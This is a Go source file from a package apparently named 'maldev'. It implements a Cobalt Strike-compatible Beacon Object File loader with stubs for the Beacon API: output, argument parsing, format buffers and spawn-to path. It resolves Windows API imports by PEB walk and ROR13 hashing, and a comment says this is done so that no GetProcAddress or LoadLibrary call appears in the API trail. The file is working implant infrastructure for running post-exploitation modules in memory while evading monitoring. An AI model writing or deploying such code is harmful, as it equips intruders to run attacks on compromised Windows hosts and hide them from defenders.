//go:build windows

package bof

import (
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"github.com/oioio-space/maldev/hash"
	"github.com/oioio-space/maldev/win/api"
)

// bofMu serialises BOF execution package-wide. The Beacon API stubs read
// currentBOF — set under bofMu by Execute — to find the per-call output
// buffer and arg parser. Concurrent Execute calls block on each other.
var (
	bofMu      sync.Mutex
	currentBOF *BOF

	beaconCBsOnce sync.Once
	beaconCBs     map[string]uintptr
)

// resolveBeaconImport returns the address that should be patched into the
// BOF for the given COFF external symbol name. Three forms are recognised:
//
//   - "__imp_BeaconXxx"           — implemented Beacon API stub (Go callback).
//   - "__imp_<DLL>$<Func>"        — Win32 dynamic-link import (e.g.
//                                   "__imp_KERNEL32$LoadLibraryA"). Resolved
//                                   via PEB walk + ROR13 export-table search
//                                   so no GetProcAddress / LoadLibrary call
//                                   shows up in the API trail.
//   - anything else               — ok=false, caller fails the relocation
//                                   with a clear "unresolved external symbol"
//                                   error rather than silently NULL-patching.
func resolveBeaconImport(name string) (uintptr, bool) {
	beaconCBsOnce.Do(initBeaconCallbacks)
	if addr, ok := beaconCBs[name]; ok {
		return addr, true
	}
	if dll, fn, ok := parseDollarImport(name); ok {
		if addr, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(fn)); err == nil {
			return addr, true
		}
	}
	return 0, false
}

// parseDollarImport splits a CS-format dynamic-link import symbol name into
// (dllname, funcname). Accepted shapes:
//
//	__imp_KERNEL32$LoadLibraryA   → ("KERNEL32.DLL", "LoadLibraryA")
//	__imp_USER32.DLL$MessageBoxW  → ("USER32.DLL", "MessageBoxW")
//
// The .DLL suffix is appended when missing — the PEB stores BaseDllName
// uppercased with the extension, so ROR13Module("KERNEL32") would not
// match the PEB walk's per-module hash.
func parseDollarImport(name string) (dll, fn string, ok bool) {
	const prefix = "__imp_"
	if !strings.HasPrefix(name, prefix) {
		return "", "", false
	}
	body := name[len(prefix):]
	idx := strings.IndexByte(body, '$')
	if idx <= 0 || idx == len(body)-1 {
		return "", "", false
	}
	dll = strings.ToUpper(body[:idx])
	fn = body[idx+1:]
	if !strings.HasSuffix(dll, ".DLL") {
		dll += ".DLL"
	}
	return dll, fn, true
}

func initBeaconCallbacks() {
	beaconCBs = map[string]uintptr{
		"__imp_BeaconPrintf":       syscall.NewCallback(beaconPrintfImpl),
		"__imp_BeaconOutput":       syscall.NewCallback(beaconOutputImpl),
		"__imp_BeaconDataParse":    syscall.NewCallback(beaconDataParseImpl),
		"__imp_BeaconDataInt":      syscall.NewCallback(beaconDataIntImpl),
		"__imp_BeaconDataShort":    syscall.NewCallback(beaconDataShortImpl),
		"__imp_BeaconDataLength":   syscall.NewCallback(beaconDataLengthImpl),
		"__imp_BeaconDataExtract":  syscall.NewCallback(beaconDataExtractImpl),
		"__imp_BeaconFormatAlloc":  syscall.NewCallback(beaconFormatAllocImpl),
		"__imp_BeaconFormatReset":  syscall.NewCallback(beaconFormatResetImpl),
		"__imp_BeaconFormatFree":   syscall.NewCallback(beaconFormatFreeImpl),
		"__imp_BeaconFormatAppend": syscall.NewCallback(beaconFormatAppendImpl),
		"__imp_BeaconFormatInt":    syscall.NewCallback(beaconFormatIntImpl),
		"__imp_BeaconFormatToString": syscall.NewCallback(beaconFormatToStringImpl),
		"__imp_BeaconFormatPrintf":   syscall.NewCallback(beaconFormatPrintfImpl),
		"__imp_BeaconErrorD":         syscall.NewCallback(beaconErrorDImpl),
		"__imp_BeaconErrorDD":        syscall.NewCallback(beaconErrorDDImpl),
		"__imp_BeaconErrorNA":        syscall.NewCallback(beaconErrorNAImpl),
		"__imp_BeaconGetSpawnTo":     syscall.NewCallback(beaconGetSpawnToImpl),
	}
}

// beaconPrintfImpl handles BeaconPrintf(int type, const char *fmt, ...).
// The C signature is variadic; syscall.NewCallback can only forward a
// fixed number of arguments and Go cannot introspect cdecl varargs from
// a callback. We forward the format string verbatim and document the
// limitation in the tech md / doc.go. BOFs that pass a literal format
// string with no % directives work correctly; BOFs relying on
// printf-style expansion see the format string raw.
func beaconPrintfImpl(typ uintptr, fmtPtr uintptr) uintptr {
	if currentBOF == nil {
		return 0
	}
	currentBOF.output.write([]byte(cStringFromPtr(fmtPtr, 65535)))
	_ = typ
	return 0
}

// beaconOutputImpl handles BeaconOutput(int type, char *data, int len).
// The bytes are copied into the BOF's output buffer.
func beaconOutputImpl(typ uintptr, dataPtr uintptr, length uintptr) uintptr {
	if currentBOF == nil || dataPtr == 0 || length == 0 {
		return 0
	}
	src := unsafe.Slice((*byte)(unsafe.Pointer(dataPtr)), int(length))
	out := make([]byte, int(length))
	copy(out, src)
	currentBOF.output.write(out)
	_ = typ
	return 0
}

// dataParser mirrors the CS BOF "datap" struct so BOF cursors stay
// stable across Beacon API calls. The C struct layout is:
//   typedef struct {
//       char *original;
//       char *buffer;
//       int   length;
//       int   size;
//   } datap;
//
// The BOF allocates the struct on its stack and hands us a pointer.
// We parse and update the fields in place — same wire format
// CS-compatible BOFs already expect.
// dataParser mirrors the CS datap struct exactly:
//
//	typedef struct {
//	    char *original;
//	    char *buffer;
//	    int   length;
//	    int   size;
//	} datap;
//
// 24 bytes on x64. Two int32 fields pack tightly with no padding.
type dataParser struct {
	original uintptr
	buffer   uintptr
	length   int32
	size     int32
}

func beaconDataParseImpl(parserPtr, bufPtr, sz uintptr) uintptr {
	if parserPtr == 0 || currentBOF == nil {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	// CS BOFs expect the first 4 bytes of the buffer to be the total
	// length (uint32), followed by length bytes of payload — the
	// BeaconDataPack convention.
	if int(sz) < 4 || bufPtr == 0 {
		p.original = bufPtr
		p.buffer = bufPtr
		p.length = 0
		p.size = 0
		return 0
	}
	header := unsafe.Slice((*byte)(unsafe.Pointer(bufPtr)), 4)
	total := int32(binary.LittleEndian.Uint32(header))
	p.original = bufPtr
	p.buffer = bufPtr + 4
	p.length = total
	p.size = total
	return 0
}

func beaconDataIntImpl(parserPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	if p.length < 4 || p.buffer == 0 {
		return 0
	}
	v := binary.LittleEndian.Uint32(unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 4))
	p.buffer += 4
	p.length -= 4
	return uintptr(v)
}

func beaconDataShortImpl(parserPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	if p.length < 2 || p.buffer == 0 {
		return 0
	}
	v := binary.LittleEndian.Uint16(unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 2))
	p.buffer += 2
	p.length -= 2
	return uintptr(v)
}

func beaconDataLengthImpl(parserPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	return uintptr(p.length)
}

// beaconDataExtractImpl mirrors char *BeaconDataExtract(datap*, int*).
// Returns a pointer to length-prefixed bytes inside the original
// buffer (the BOF reads them in place). The optional outLen is
// written if non-nil.
func beaconDataExtractImpl(parserPtr, outLenPtr uintptr) uintptr {
	if parserPtr == 0 {
		return 0
	}
	p := (*dataParser)(unsafe.Pointer(parserPtr))
	if p.length < 4 || p.buffer == 0 {
		return 0
	}
	header := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 4)
	chunkLen := int32(binary.LittleEndian.Uint32(header))
	p.buffer += 4
	p.length -= 4
	if chunkLen < 0 || chunkLen > p.length {
		return 0
	}
	dataPtr := p.buffer
	p.buffer += uintptr(chunkLen)
	p.length -= chunkLen
	if outLenPtr != 0 {
		*(*int32)(unsafe.Pointer(outLenPtr)) = chunkLen
	}
	return dataPtr
}

// formatp mirrors the CS BOF format-buffer struct. Same wire shape as
// dataParser — the BOF allocates the struct on its stack and we
// manage cursor + size in place. Underlying bytes live in a Go-side
// map (formatBuffers) keyed by the formatp pointer; this keeps the
// slice referenced so Go's GC won't reclaim it while the BOF holds
// the pointer.
type formatp struct {
	original uintptr
	buffer   uintptr
	length   int32
	size     int32
}

var (
	formatBufMu  sync.Mutex
	formatBuffers = map[uintptr][]byte{}
)

// beaconFormatAllocImpl handles BeaconFormatAlloc(format*, int maxsz).
// Allocates a maxsz-byte slice in Go heap, stores it under the formatp
// pointer, and seeds the BOF-visible cursor/size fields.
func beaconFormatAllocImpl(formatPtr, maxsz uintptr) uintptr {
	if formatPtr == 0 || maxsz == 0 {
		return 0
	}
	buf := make([]byte, int(maxsz))
	formatBufMu.Lock()
	formatBuffers[formatPtr] = buf
	formatBufMu.Unlock()
	base := uintptr(unsafe.Pointer(&buf[0]))
	p := (*formatp)(unsafe.Pointer(formatPtr))
	p.original = base
	p.buffer = base
	p.length = 0
	p.size = int32(maxsz)
	return 0
}

// beaconFormatResetImpl rewinds the cursor to the start of the buffer.
func beaconFormatResetImpl(formatPtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	p.buffer = p.original
	p.length = 0
	return 0
}

// beaconFormatFreeImpl drops the Go-side slice. After Free, subsequent
// calls on the same formatp are no-ops (the slice is gone, length is
// already zero).
func beaconFormatFreeImpl(formatPtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	formatBufMu.Lock()
	delete(formatBuffers, formatPtr)
	formatBufMu.Unlock()
	p := (*formatp)(unsafe.Pointer(formatPtr))
	p.original = 0
	p.buffer = 0
	p.length = 0
	p.size = 0
	return 0
}

// beaconFormatAppendImpl writes len bytes from src into the format
// buffer at the current cursor. Truncates silently when the buffer is
// full — matches the CS contract of "best-effort append, callers
// check size".
func beaconFormatAppendImpl(formatPtr, srcPtr, length uintptr) uintptr {
	if formatPtr == 0 || srcPtr == 0 || length == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	remaining := p.size - p.length
	if remaining <= 0 {
		return 0
	}
	n := int32(length)
	if n > remaining {
		n = remaining
	}
	src := unsafe.Slice((*byte)(unsafe.Pointer(srcPtr)), int(n))
	dst := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), int(n))
	copy(dst, src)
	p.buffer += uintptr(n)
	p.length += n
	return 0
}

// beaconFormatIntImpl writes a 4-byte int in big-endian (network byte
// order) per the CS convention. Cobalt Strike's BeaconFormatInt is the
// counterpart of BeaconDataInt — when the BOF is producing a buffer
// the operator pulls back, the int is read on the operator side via
// the same convention. We follow their order.
func beaconFormatIntImpl(formatPtr, val uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	if p.size-p.length < 4 {
		return 0
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(p.buffer)), 4)
	v := uint32(val)
	dst[0] = byte(v >> 24)
	dst[1] = byte(v >> 16)
	dst[2] = byte(v >> 8)
	dst[3] = byte(v)
	p.buffer += 4
	p.length += 4
	return 0
}

// beaconFormatToStringImpl returns the original buffer pointer and
// writes the current length into outSize. The BOF then reads
// length bytes starting at the returned pointer. CS BOFs pair this
// with BeaconOutput to ship the format buffer out of the implant.
func beaconFormatToStringImpl(formatPtr, outSizePtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}
	p := (*formatp)(unsafe.Pointer(formatPtr))
	if outSizePtr != 0 {
		*(*int32)(unsafe.Pointer(outSizePtr)) = p.length
	}
	return p.original
}

// beaconFormatPrintfImpl handles BeaconFormatPrintf(format*, fmt, ...).
// Like BeaconPrintf, the variadic argument list cannot be expanded from
// inside a syscall.NewCallback thunk — Go has no way to walk a cdecl
// va_list captured by a stdcall callback. We forward the format string
// verbatim into the format buffer; BOFs that pass a literal string
// with no `%` directives behave correctly. See tech md "Beacon-API
// limitations" for the full rationale and the design alternatives
// (no-resolve / cgo) the project rejected.
func beaconFormatPrintfImpl(formatPtr, fmtPtr uintptr) uintptr {
	if formatPtr == 0 || fmtPtr == 0 {
		return 0
	}
	s := []byte(cStringFromPtr(fmtPtr, 65535))
	if len(s) == 0 {
		return 0
	}
	beaconFormatAppendImpl(formatPtr, uintptr(unsafe.Pointer(&s[0])), uintptr(len(s)))
	return 0
}

// writeError appends a formatted error line to currentBOF.errors (or
// no-ops when currentBOF is nil — defensive guard for unit tests that
// don't go through Execute).
func writeError(line string) {
	if currentBOF == nil || currentBOF.errors == nil {
		return
	}
	currentBOF.errors.write([]byte(line))
}

func beaconErrorDImpl(typ uintptr, d uintptr) uintptr {
	writeError(fmtSprintf("error type=%d data=%d\n", uint32(typ), uint32(d)))
	return 0
}

func beaconErrorDDImpl(typ uintptr, d1, d2 uintptr) uintptr {
	writeError(fmtSprintf("error type=%d data1=%d data2=%d\n", uint32(typ), uint32(d1), uint32(d2)))
	return 0
}

func beaconErrorNAImpl(typ uintptr) uintptr {
	writeError(fmtSprintf("error type=%d\n", uint32(typ)))
	return 0
}

// beaconGetSpawnToImpl returns a pointer to the configured spawn-to
// path (NUL-terminated), or 0 when none was set. The path bytes live
// in the BOF's spawnToCStr field — pinned for the BOF instance's
// lifetime so the address stays stable across Beacon API callbacks.
func beaconGetSpawnToImpl(_ uintptr, _ uintptr) uintptr {
	if currentBOF == nil || len(currentBOF.spawnToCStr) == 0 {
		return 0
	}
	return uintptr(unsafe.Pointer(&currentBOF.spawnToCStr[0]))
}

// fmtSprintf is a thin alias for fmt.Sprintf so the Beacon error stubs
// can be unit-tested with a fake formatter if needed.
var fmtSprintf = fmt.Sprintf

// cStringFromPtr is a thin local alias for api.CStringFromPtr. The
// helper was promoted to win/api as the canonical home for native-
// pointer-to-Go-string conversions; this alias keeps the in-file
// call sites short and the existing tests compatible.
func cStringFromPtr(ptr uintptr, max int) string {
	return api.CStringFromPtr(ptr, max)
}
